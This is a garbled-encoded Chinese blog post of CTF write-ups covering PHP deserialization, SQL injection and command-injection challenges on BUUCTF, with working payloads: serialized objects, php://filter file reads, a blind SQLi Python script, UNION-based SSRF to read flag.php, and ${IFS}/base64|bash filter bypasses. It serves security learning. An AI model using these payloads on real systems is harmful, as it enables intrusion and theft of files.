<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHPï¼ˆç®€å•ååºåˆ—åŒ–ï¼‰</h2><p>è€ƒå¯Ÿphpååºåˆ—åŒ–ï¼Œå…ˆä¸‹è½½www.zipé‡Œé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œå…¶ä¸­æœ‰class.phpï¼Œindex.phpï¼Œflag.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­é€»è¾‘å°±æ˜¯å¯†ç ä¸º100ï¼Œå¹¶ä¸”username=â€™adminâ€˜</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $username = <span class="string">"admin"</span>;</span><br><span class="line">	<span class="keyword">private</span> $password = <span class="string">"100"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Name();</span><br><span class="line">$a = serialize($a); </span><br><span class="line"><span class="keyword">echo</span> urlencode($a);</span><br><span class="line"><span class="comment">//O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></span><br></pre></td></tr></table></figure>
<p>æœ€åè¿›è¡Œurlç¼–ç å°±è¡Œã€‚</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;  <span class="comment">//textçš„å†…å®¹ä¸ºwelcome to the zjctf</span></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not now!"</span>;  <span class="comment">//fileçš„å†…å®¹ä¸èƒ½åŒ…å«flag</span></span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);  <span class="comment">//useless.php</span></span><br><span class="line">        $password = unserialize($password);  <span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>çœ‹æºç çŸ¥é“å…±æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ä¾æ¬¡åˆ¤æ–­</p>
<p>textçš„å†…å®¹ä¸ºwelcome to the zjctfï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨dataåè®®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf</span><br><span class="line">text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
<p>ä¹‹åæ˜¯fileï¼Œé¢˜ä¸­å·²ç»æç¤ºäº†useless.phpï¼Œè¯´æ˜æˆ‘ä»¬é¦–å…ˆå¾—æ‹¿å‡ºæºç ï¼Œä¹‹ååŒ…å«è¿™ä¸ªæ–‡ä»¶</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
<p>æ‹¿å‡ºæºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä¹‹åå°±æ˜¯passwordï¼Œå¾ˆæ˜æ˜¾æ˜¯åºåˆ—åŒ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;5bfc7735-e6c3-4e4b-9612-573138d921bd.node3.buuoj.cn&#x2F;?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æºç å°±æœ‰flag</p>
<h2 id="ç½‘é¼æ¯-2018-Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰"><a href="#ç½‘é¼æ¯-2018-Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰"></a>[ç½‘é¼æ¯ 2018]Fakebookï¼ˆæŠ¥é”™æ³¨å…¥å’Œååºåˆ—åŒ–ï¼‰</h2><p>é¦–å…ˆå‘ç°ä¿¡æ¯æ³„éœ²</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;user.php.bak</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;	<span class="comment">//åˆ›å»ºä¸€ä¸ªcurlèµ„æº</span></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">       <span class="comment">//è®¾ç½®urlå’Œç›¸åº”çš„é€‰é¡¹</span></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">      <span class="comment">//æŠ“å–urlå¹¶ä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span></span><br><span class="line">        curl_close($ch);</span><br><span class="line">			<span class="comment">//å”¯ä¸€çš„å‚æ•°æ˜¯curl_init()å‡½æ•°è¿”å›çš„å¥æŸ„</span></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ‰¾äº†å¥½é•¿æ—¶é—´ï¼Œæ‰¾ä¸åˆ°æ³¨å…¥ç‚¹</p>
<p>åæ¥å‘ç°ï¼Œç™»å½•ä¹‹åï¼Œå¯ä»¥æŸ¥çœ‹ä¸€äº›ä¿¡æ¯</p>
<p>å¹¶ä¸”å¾ˆé‡è¦çš„æ˜¯view.phpä¸­noæ˜¯å¯ä»¥æ³¨å…¥çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Fatal"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line">payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line"><span class="comment">#users</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name="users"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:11;s:4:"blog";s:8:"pz1o.top";&#125;</span></span><br></pre></td></tr></table></figure>
<p>å…¶å®ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥ï¼Œä½†å½“æ—¶ä»¥ä¸º0x7eè¢«banäº†ä¹‹åå°±ä¸èƒ½æŠ¥é”™äº†ï¼Œtcl</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1%20and%20extractvalue(1,concat(%27$%27,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>()))))%<span class="number">23</span></span><br><span class="line">fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br><span class="line"><span class="keyword">users</span></span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_name=%<span class="number">27</span><span class="keyword">users</span>%<span class="number">27</span>)))%<span class="number">23</span></span><br><span class="line"><span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>,<span class="keyword">USER</span>,CU</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span> extractvalue(%<span class="number">27</span>$%<span class="number">27</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span> <span class="keyword">data</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>åšåˆ°è¿™å…¶å®å°±ä¸ä¼šåšäº†ã€‚ã€‚ã€‚çœ‹å¤§å¸ˆå‚…çš„wpæ‰çŸ¥é“å¯ä»¥noå‚æ•°æ³¨å…¥ååºåˆ—åŒ–</p>
<p>å…¶ä¸­payloadä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure>
<p>è‡³äºä¸ºä»€ä¹ˆä¼šæƒ³åˆ°è¿™ä¸ªï¼Œé¦–å…ˆdataä¸­å°±æ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ï¼Œæœ€åä¸€ä¸ªblogå†…å®¹ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·å°±å¸Œæœ›ä»blogä¸­è·å¾—flag</p>
<h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="GXYCTF2019-Ping-Ping-Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰"><a href="#GXYCTF2019-Ping-Ping-Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰" class="headerlink" title="[GXYCTF2019]Ping Ping Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰"></a>[GXYCTF2019]Ping Ping Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰</h2><p>ç›´æ¥pingå‘½ä»¤æ‰§è¡Œ</p>
<p>ç”¨åˆ†å·æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹æœ‰flag.phpï¼Œé‡è¦çš„å°±æ˜¯æ€ä¹ˆå»è¯»å–flag.php</p>
<p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png" alt="image-20200831111916451"></p>
<p><strong>è¿™é‡Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç»•è¿‡ç©ºæ ¼çš„åŠæ³•ï¼Œç®€å•æ¥è¯´æœ‰ä¸¤ç§</strong>ï¼Œç¬¬ä¸€ç§æ˜¯${IFS}</p>
<ol>
<li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat$IFS$1flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ç¬¬äºŒç§å‘¢æ˜¯é‡å®šå‘ç¬¦</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
<p>root@kali:~# cat&lt;flag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">è¿™é‡Œå‘¢æˆ‘ä»¬é€‰ç”¨$&#123;IFS&#125;æ¥ç»•è¿‡ï¼Œä¹‹ååˆå‘ç°&#123;&#125;è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸‰ä¸ªæ–¹å¼</span><br><span class="line"></span><br><span class="line">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class="line"></span><br><span class="line">è¿™æ—¶ï¼Œæˆ‘ä»¬å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥**é»‘åå•ç»•è¿‡åˆæœ‰å‡ ç§æ–¹å¼**</span><br><span class="line"></span><br><span class="line">1. æ‹¼æ¥</span><br></pre></td></tr></table></figure>
<p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2. base64ç¼–ç </span><br></pre></td></tr></table></figure>
<p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p>
<p>root@kali:~# echo â€œY2F0IGZsYWc=â€|base64 -d|bash<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. å•å¼•å·ã€åŒå¼•å·</span><br></pre></td></tr></table></figure>
<p>root@kali:~# câ€â€at flâ€™â€™ag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. åæ–œçº¿</span><br></pre></td></tr></table></figure>
<p>root@kali:~# c\at fl\ag<br>this is your flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">è¿™é‡Œç›´æ¥æ‹¼æ¥è¿‡å»å°±å¥½</span><br></pre></td></tr></table></figure>
<p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">å³å¯æ‹¿åˆ°flag</span><br><span class="line"></span><br><span class="line">**ä¸»è¦æ˜¯ç»•è¿‡ç©ºæ ¼å’Œç»•è¿‡é»‘åå•**</span><br><span class="line"></span><br><span class="line">## [RoarCTF 2019]Easy Calcï¼ˆphpå­—ç¬¦ä¸²è§£æï¼‰</span><br><span class="line"></span><br><span class="line">æ‰“å¼€æºç ï¼Œå‘ç°calc.php ï¼Œç„¶åè®¿é—®calc.php</span><br><span class="line"></span><br><span class="line">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class="line"></span><br><span class="line">numå˜é‡è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æˆ‘ä»¬ç”¨ä¸€äº›å‡½æ•°å»è®¿é—®æ—¶ï¼Œä¼šå‘ç°403æ‹’ç»è®¿é—®ï¼Œè¯´æ˜æœ‰waf</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç½‘ä¸ŠæŸ¥æ‰¾ï¼Œæ˜¯**phpçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§**</span><br><span class="line"></span><br><span class="line">&gt; PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</span><br><span class="line">&gt;</span><br><span class="line">&gt; 1.åˆ é™¤ç©ºç™½ç¬¦ </span><br><span class="line">&gt;</span><br><span class="line">&gt; 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘</span><br><span class="line"></span><br><span class="line">å…ˆè¯•ä¸€è¯•phpinfo();å¯ä»¥ç”¨è¯´æ˜æˆ‘ä»¬å°±æˆåŠŸäº†ã€‚</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥ï¼Œå°±æ˜¯è¯»å–ç›®å½•ï¼Œæ‰¾flagäº†ï¼Œä»phpinfoä¸­æˆ‘ä»¬å¯ä»¥çœ‹è§ä¸€äº›å¤–éƒ¨å‡½æ•°è¢«banäº†</span><br><span class="line"></span><br><span class="line">è¿™æ—¶å°±éœ€è¦ä»‹ç»ä»¥ä¸‹å‡ ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line">1. **scandir() å‡½æ•°**:</span><br><span class="line">   è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line"></span><br><span class="line">2. **base_convert(number,formbase,tobase) å‡½æ•°**:</span><br><span class="line"></span><br><span class="line">   åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</span><br><span class="line"></span><br><span class="line">3. **dechex() å‡½æ•°**ï¼š</span><br><span class="line"></span><br><span class="line">   æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚</span><br><span class="line"></span><br><span class="line">4. **hex2bin() å‡½æ•°**ï¼š</span><br><span class="line"></span><br><span class="line">   æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">5. **readfile() å‡½æ•°**:</span><br><span class="line"></span><br><span class="line">   è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">6. **chr()å‡½æ•°**</span><br><span class="line"></span><br><span class="line">   åè¿›åˆ¶è¿”å›asciiå­—ç¬¦</span><br><span class="line"></span><br><span class="line">7. **ord()å‡½æ•°**</span><br><span class="line"></span><br><span class="line">   asciiå­—ç¬¦è½¬æ¢ä¸ºåè¿›åˆ¶</span><br><span class="line"></span><br><span class="line">8. **file_get_contents()**</span><br><span class="line"></span><br><span class="line">   æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br><span class="line"></span><br><span class="line">é€šå¸¸ä¼šç”¨hex2bin(dechex(47))ä¸€èµ·ä½¿ç”¨ï¼Œè¿™ä¸ªè¡¨ç¤º&#x2F;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ&#x2F;è¢«è¿‡æ»¤äº†</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥payloadå¯ä»¥ä¸º</span><br></pre></td></tr></table></figure>
<p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">å‘ç°flagç›´æ¥readfileè¯»å–å³å¯</span><br></pre></td></tr></table></figure>
<p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">è¿˜æœ‰å…¶ä»–çš„payload</span><br></pre></td></tr></table></figure>
<p>? num=base_convert(55490343972,10,36)()</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## [ACTF2020 æ–°ç”Ÿèµ›]Exec</span><br><span class="line"></span><br><span class="line">ç›´æ¥æŸ¥å°±å¯ä»¥</span><br></pre></td></tr></table></figure>
<p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p>
